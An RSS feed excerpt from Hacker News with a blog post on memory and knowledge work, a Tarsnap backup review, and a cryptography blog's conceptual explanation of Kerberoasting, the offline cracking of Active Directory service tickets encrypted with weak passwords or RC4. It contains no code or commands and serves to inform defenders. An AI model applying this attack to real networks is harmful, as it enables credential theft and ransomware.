            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45198420</guid>
            <description><![CDATA[Debunking the myth that search engines and AI eliminate the need for memory. Building deep knowledge through active learning remains essential for critical thinking, despite promises of instant information access.]]></description>
            <content:encoded><![CDATA[
    
    
      

    
        
            

            
                Sep 9th, 2025
                by Sascha
                
                
            

            

            
        

        Dear Zettlers,

This scam is decades old now and it is quite surprising that people still fall for it.

The search engines, old note-taking apps (you know, those with an elephant icon and the like) and AI have something in common: They claim that the effort of remembering things is outdated like using a candle in the age of electric light.

The following is, by the way, from my Zettelkasten (2016):


  To find what you need online, you require a solid general education and, above all, prior knowledge in the area related to your search.1


Original in German:


  Was man braucht, um im Netz fündig zu werden, ist eine solide Grundbildung und vor allem Vorwissen in dem Bereich, in dem sich die Suche bewegt.  
—Manfred Spitzer, Digitale Demenz1


Culturally, it is increasingly the case that the first step is to go online, search for the a desired end result of a thinking process instead of engaging in learning. This means that we are using the internet less and less to our advantage, because we have less and less prior knowledge: We detrain ourselves out of the ability to access the quality of the information and turn it into actual knowledge.

Rowlands et al. wrote about the so called “digital natives” that they lack the critical and analytical thinking skills to evaluate the information they find on the internet.2 We need a fully developed mental map of the subject in order to derive value from the results of an internet search.

In short: You need a trained brain to actually benefit from the internet.

The advertised benefits of all these tools come with a specific hidden cost: Your ability to think.

Let’t take a closer look at the digital natives, since this issue is more accessible. They put themselves in a situation in which there is a vastly reduced incentive structure to evaluate the information critically. They use surface level indicators if the information matches the request. This behaviour has some obvious effects (in hindsight):


  The reduced engagement with the material reduces the emotional weight of the whole line of action. You mind is an engine that is fuelled by emotion. Without any emotion, you don’t think. Rather, you try to imitate thinking efficiently.
  The more you interact with information being emotionally disengaged and keeping it on the surface level, the more you develop the habit to engage with information in a way that it doesn’t change your brain.


So the more you work in a superficial way, the more brittle the knowledge foundation in your mind will be on which you base your cognitive actions.

This drives us to one of the most important conclusions of the entire field of note-taking, knowledge work, critical thinking and alike: You, not AI, not your PKM or whatever need to build the knowledge because only then it is in your brain and you can go the next step.

Let me try to give you a demonstration of the issue:

I asked ChatGPT to design an optimal weekly training schedule for health span and fitness. This is the answer:

Here’s a table outlining the optimal weekly workout schedule for health span and longevity based on the assumption that you should focus on aerobic capacity, muscle strength, mobility/flexibility, and neuromuscular coordination:


  
    
      Day
      Workout Type
      Focus
      Duration
      Details
    
  
  
    
      Monday
      Full-Body Strength Training
      Muscle mass, metabolic health
      45–60 min
      Warm-up: Dynamic stretches (5 min)  - Squats, Deadlifts, Push-ups, Pull-ups (3x 8–12 reps)  - Core: Plank (3x 30–60 sec)  - Cool-down: Static stretches (5 min)
    
    
      Tuesday
      Low-Intensity Cardio & Mobility
      Heart health, joint function
      30–60 min
      Brisk walking, cycling, or swimming (30–45 min)  - Yoga or joint mobility exercises (15 min)
    
    
      Wednesday
      High-Intensity Interval Training (HIIT)
      Cardiovascular fitness, metabolism
      20–30 min
      Warm-up: Light jogging (5 min)  - 30 sec sprint / 90 sec walk (15–20 min) OR Bodyweight circuit (40 sec on/20 sec rest)  - Cool-down: Stretching (5 min)
    
    
      Thursday
      Active Recovery & Balance
      Recovery, neuromuscular coordination
      30–45 min
      Easy yoga, tai chi, or a nature walk (20–30 min)  - Balance drills: Single-leg stands, heel-to-toe walking (10–15 min)
    
    
      Friday
      Upper-Body Strength & Core
      Upper-body strength, core stability
      45–60 min
      Warm-up: Arm/shoulder stretches (5 min)  - Overhead Press, Pull-ups, Push-ups, Rows (3x 8–12 reps)  - Core: Russian twists or bird-dogs (3 sets)  - Cool-down: Static stretches (5 min)
    
    
      Saturday
      Moderate-Intensity Cardio
      Endurance, cardiovascular health
      45–60 min
      Steady activity: Jogging, cycling, swimming, rowing, or hiking (60–70% max heart rate)  - Cool-down: Easy pace and stretches (5 min)
    
    
      Sunday
      Mobility & Flexibility
      Recovery, flexibility
      30–60 min
      Yoga session focusing on stretching major muscle groups  - Foam rolling or myofascial release
    
  


Looks good alright? Or does it? How do you know? You can’t if you don’t have sufficient background knowledge. Here is a little quiz if you have the sufficient background knowledge:


  How do volume and intensity factor in strength gains?
  What is the difference between aerobic capacity and aerobic power?
  How do you weigh each minute spend on flexibility against the minutes spent on aerobic capacity and strength?


If you can’t produce a comprehensive answer with confidence and on the whim the second you read the question, you don’t have the sufficient background knowledge.

“I just ask ChatGPT for that, too!”, the AI generation might ask. Ok, and then what? How can you assess the answers to those three questions (which represent only a fraction of needed knowledge!)?

What is going wrong? You are taking on an impossible task, because you can’t use enough of your brain for your cognitive operations. Assuming that you have no comprehensive knowledge in health and fitness, terms like “aerobic capacity” or “core stability” only activate some superficial level associations. But if you are deeply involved with the topic the term “aerobic capacity” activates way more. Here are some examples (just a small fraction):


  Two discussions of Olaf Alexander Bu on the difference between capacity and power numbers in measuring endurance performances.
  A mental map on the aerobic metabolism.
  The tension between peripheral endurance improvements (like mitochondrial biogenesis) central improvements (like improved cardiac output) and their connection (like angiogenesis)
  The still ongoing discussion between low intensity exercise and high intensity exercise as the best tool to build aerobic capacity for the non-professional athlete.
  The differences between running, cycling, rowing and all the other movements to build aerobic capacity.
  An open task to review a paper on interval length that you found in “Textbook of Work Physiology” by Astrand and Rodahl.


This is a small fraction of what I can observe in my mind and there is a lot more going on unconsciously. Now consider that I might be very well-read in the domain of health and fitness. But multiply this by a factor of 100 if you replace me with an expert like Olaf Alexander Bu when it comes to the term “aerobic capacity”.

In knowledge work the bottleneck is not the external availability of information. It is the internal bandwidth of processing power which is determined by your innate abilities and the training status of your mind.

So, coming back to the initial starting point that “you don’t have to remember anything”. The opposite is true.

You have to remember EVERYTHING. Only then you can perform the cognitive tasks necessary to perform meaningful knowledge work.

The way you train your mind is the way your mind can perform. Simple tools like spaced repetition allow your mind to perform simple tasks, complex tools like the Zettelkasten Method allow your mind to master complex tasks. Remember my mantra of depth of processing? Perhaps, you can rephrase it to train your mind for depth.

The field of knowledge work will not advance if we don’t come to terms that we can’t circumvent the work needed to train our minds.

Live long and prosper  
Sascha

  
    
      Manfred Spitzer (2012):  Digitale Demenz. Wie wir uns und unsere Kinder um den Verstand bringen, Munich: Droemer, S. 211. ↩ ↩2
    
    
      Ian Rowlands, David Nicholas, Peter Williams, Paul Huntington, Maggie Fieldhouse, Barrie Gunter, Richard Withey, Hamid R. Jamali, Tom Dobrowolski, and Carol Tenopir (2008):  The Google generation: the information behavior of the researcher of the future, Aslib Proceedings 4, 2008, Vol. 60, pp. 290-310. ↩
    
  



        
    

    
  



    
      
        
      
    


    
  ]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Guy running a Google rival from his laundry room]]></title>
            <link>https://www.fastcompany.com/91396271/searcha-page-seekninja-diy-search-engines</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45197187</guid>
        </item>
        <item>
            <title><![CDATA[Tarsnap Is Cozy]]></title>
            <link>https://til.andrew-quinn.me/posts/tarsnap-is-cozy/</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45196568</guid>
            <description><![CDATA[I have been aware of tarsnap for a long time, but only recently did I actually get around to using it for anything, as a result of my big personal digital resiliency audit for 2025. For those of you not in the know, tarsnap is &ldquo;online backups for the truly paranoid&rdquo;, and tarsnap the command-line program is the client-side tool you invoke to actually zip up and push your archives into the vault. Its creator, Dr. Colin Percival, is a really smart and interesting dude for a whole bunch of reasons. I&rsquo;m led to believe the whole business is basically a two-man show between him and his brother these days.]]></description>
            <content:encoded><![CDATA[I have been aware of
tarsnap
for a long time, but only recently did I actually
get around to using it
for anything, as a result of my big
personal digital resiliency audit for 2025.
For those of you not in the know, tarsnap is
“online backups for the truly paranoid”, and
tarsnap the command-line program is the client-side
tool you invoke to actually zip up and push your
archives into the vault. Its creator,
Dr. Colin Percival,
is a really smart and interesting dude for a whole
bunch of reasons. I’m led to believe the whole
business is basically a two-man show between him and
his brother these days.Tarsnap feels… cozy to use.
I know that’s a weird word to pick for something
most people use to back up, like, extreme
cryptocurrency wallet codes and the like, but
every single thing about it just feels well-considered
from both a Unix sysadmin’s usability standpoint
and from a general product standpoint. The client
side CLI tool is based off of how tar itself works.
The prepaid model means that at any point I can
effectively guarantee anonymity by just shredding
up my keyfiles and letting the $15.123412341234123412
or what have you I still have remaining in the account
quietly run out, at which point the digital noise that
corresponds to whatever I have in there will be
unceremoniously deleted. These two things mean I feel
extremely safe just sticking the whole thing into a
one-liner hourly cronjob if need be and let it rip.People have often complained they don’t have a good
sense for the pricing, so I
hacked together a little Tarsnap cost estimator here.
If you use it solely to back up the
few megabytes of
“crown jewels” data we all have lying around,
don’t be surprised if the calculator tells you
your initial $5 or such will last for over
1,000 years. About the only thing I could think
I might want more from a service like this is
the opportunity to use a hardware key instead of
a keyfile - I’m sure Colin has thought about this
possibility himself and has good reasons for or
against implementing it, however.Hats off to you, Dr. Percival. This truly is a
dream product.]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Kerberoasting]]></title>
            <link>https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45196437</guid>
            <description><![CDATA[I learn about cryptographic vulnerabilities all the time, and they generally fill me with some combination of jealousy (“oh, why didn’t I think of that”) or else they impress me w…]]></description>
            <content:encoded><![CDATA[
	
	
		
I learn about cryptographic vulnerabilities all the time, and they generally fill me with some combination of jealousy (“oh, why didn’t I think of that”) or else they impress me with the brilliance of their inventors. But there’s also another class of vulnerabilities: these are the ones that can’t possibly exist in important production software, because there’s no way anyone could still do that in 2025.



Today I want to talk about one of those ridiculous ones, something Microsoft calls “low tech, high-impact”. This vulnerability isn’t particularly new; in fact the worst part about it is that it’s had a name for over a decade, and it’s existed for longer than that. I’ll bet most Windows people already know this stuff, but I only happened to learn about it today, after seeing a letter from Senator Wyden to Microsoft, describing how this vulnerability was used in the May 2024 ransomware attack on the Ascension Health hospital system.



The vulnerability is called Kerberoasting, and TL;DR it relies on the fact that Microsoft’s Active Directory is very, very old. And also: RC4. If you don’t already know where I’m going with this, please read on.



A couple of updates: The folks on HN pointed out that I was using some incorrect terms in here (sorry!) and added some good notes, so I’m updating below.



What’s Kerberos, and what’s Active Directory?



Microsoft’s Active Directory (AD) is a many-tentacled octopus that controls access to almost every network that runs Windows machines. The system uses centralized authentication servers to determine who gets access to which network resources. If an employee’s computer needs to access some network Service (a file server, say), an Active Directory server authenticates the user and helps them get securely connected to the Service.



This means that AD is also the main barrier ensuring that attackers can’t extend their reach deeper into a corporate network. If an attacker somehow gets a toehold inside an enterprise (for example, because an employee clicks on a malicious Bing link), they should absolutely not be able to move laterally and take over critical network services. That’s because any such access would require the employee’s machine to have access to specialized accounts (called “Service accounts”) with privileges to fully control those machines. A well-managed network obviously won’t allow this. This means that AD is the “guardian” that stands between most companies and total disaster.



Unfortunately, Active Directory is a monster dragged from the depths of time. It uses the Kerberos protocol, which was first introduced in early 1989. A lot of things have happened since 1989! In fairness to Microsoft, Active Directory itself didn’t actually debut until about 1999; but (in less fairness), large portions of its legacy cryptography from that time period appear to still be supported in AD. This is very bad, because the cryptography is exceptionally terrible. 



Let me get specific.



When you want to obtain access to some network resource (a “Service” in AD parlance), you first contact an AD server (called a KDC) to obtain a “ticket” that you can send to the Service to authenticate. This ticket is encrypted using a long-term Service “password” established at the KDC and the Service itself, and it’s handed to the user making the call.



Now, ideally, this Service password is not really a password at all: it’s actually a randomly-generated cryptographic key. Microsoft even has systems in place to generate and rotate these keys regularly. This means the encrypted ticket will be completely inscrutable to the user who receives it, even if they’re malicious. But occasionally network administrators will make mistakes, and one (apparently) somewhat common mistake is to set up a Service that’s connected to an ordinary user account, complete with a human-generated password.



Since human passwords probably are not cryptographically strong, the tickets encrypted using them are extremely vulnerable to cracking. This is very bad, since any random user — including our hypothetical laptop malware hacker — can now obtain a copy of such a ticket, and attempt to crack the Service’s password offline by trying many candidate passwords using a dictionary attack. The result of this is that the user learns an account password that lets them completely control that essential Service. And the result of that (with a few extra steps) is often ransomware.



Isn’t that cute?



That doesn’t actually seem very cute?



Of course, it’s not. It’s actually a terrible design that should have been done away with decades ago. We should not build systems where any random attacker who compromises a single employee laptop can ask for a message encrypted under a critical password! This basically invites offline cracking attacks, which do not need even to be executed on the compromised laptop — they can be exported out of the network to another location and performed using GPUs and other hardware.



There are a few things that can stop this attack in practice. As we noted above, if the account has a long enough (random!) password, then cracking it should be virtually impossible. Microsoft could prevent users from configuring services with weak human-generated passwords, but apparently they don’t — at least because this is something that’s happened many times (including at Ascension Health.) 



So let’s say you did not use a strong cryptographic key as your Service’s password. Where are you?



Your best hope in this case is that the encrypted tickets are extremely challenging for an attacker to crack. That’s because at this point, the only thing preventing the attacker from accessing your Service is computing power. But — and this is a very weak “but” — computing power can still be a deterrent! In the “standard” authentication mode, tickets are encrypted with AES, using a key derived using 4,096 iterations of PBKDF2 hashing, based on the Service password and a per-account salt (Update: which is not truly random salt, it’s a combination of domain and principal name.) The salt means an attacker cannot easily pre-compute a dictionary of hashed passwords, and while the PBKDF2 (plus AES) isn’t an amazing defense, it puts some limits on the number of password guesses that can be attempted in a given unit of time.



This page by Chick3nman gives some excellent password cracking statistics computed using an RTX 5090. It implies that a hacker can try 6.8 million candidate passwords every second, using AES-128 and PBKDF2.



So that’s not great. But also not terrible, right?



This isn’t the end of the story. In fact it’s self-evident that this is not the end of the story, because Active Directory was invented in 1999, which means at some point we’ll have to deal with RC4.



Here’s the thing. Anytime you see cryptography born in the 1990s and yet using AES, you cannot be dealing with the original. What you’re looking at is the modernized, “upgraded” version of the original. The original probably used an abacus and witchcraft, or (failing that) at least some combination of unsalted hash functions and RC4. And here’s the worst part: it turns out that in Active Directory, when a user does not configure a Service account to use a more recent mode, then Kerberos will indeed fall back to RC4, combined with unsalted NT hashes (basically, one iteration of MD4.)



The main implication of using RC4 (and NT hashing) is that tickets encrypted this way become hilariously, absurdly fast to crack. According to our friend Chick3nman, the same RTX 5090 can attempt 4.18 billion (with a “b”) password guesses every second. That’s roughly 1000x faster than the AES variant.



As an aside, the NT hashes are not salted, which means they’re vulnerable to pre-computation attacks that involve rainbow tables. I had been meaning to write about rainbow tables recently on this blog, but had convinced myself that they mostly don’t matter, given that these ancient unsalted hash functions are going away. I guess maybe I spoke too soon? Update: see Tom Tervoort’s excellent comment below, which mentions that there is a random 8-byte “confounder” acting as a salt during key derivation.



So what is Microsoft doing about this?



Clearly not enough. These “Kerberoasting” attacks have been around for ages: the technique and name is credited to Tim Medin who presented it in 2014 (and many popular blogs followed up on it) but the vulnerabilities themselves are much older. The fact that there are practical ransomware attacks using these ideas in 2024 indicates that (1) system administrators aren’t hardening things enough, but more importantly, (2) Microsoft is still not turning off the unsafe options that make these attacks possible.







To give some sense of where we are, in October 2024, Microsoft published a blog post on how to avoid Kerberos-based attacks (NB: I cannot say Kerberoasting again and take myself seriously). 



The recommendations are all kind of dismal. They recommend that administrators should use proper automated key assignment, and if they can’t do that, then to try to pick “really good long passwords”, and if they can’t do that, to pretty please shut off RC4. But Microsoft doesn’t seem to do anything proactive, like absolutely banning obsolete legacy stuff, or being completely obnoxious and forcing admins to upgrade their weird and bad legacy configurations. Instead this all seems much more like a reluctant and half-baked bit of vulnerability management.



I’m sure there are some reasons why this is, but I refuse to believe they’re good reasons, and Microsoft should probably try a lot harder to make sure these obsolete services go away. It isn’t 1999 anymore, and it isn’t even 2014.



If you don’t believe me on these points, go ask Ascension Health.
	

			
	]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[OrioleDB Patent: now freely available to the Postgres community]]></title>
            <link>https://supabase.com/blog/orioledb-patent-free</link>
            <guid isPermaLink="false">https://news.ycombinator.com/item?id=45196173</guid>
        </item>
    </channel>
</rss>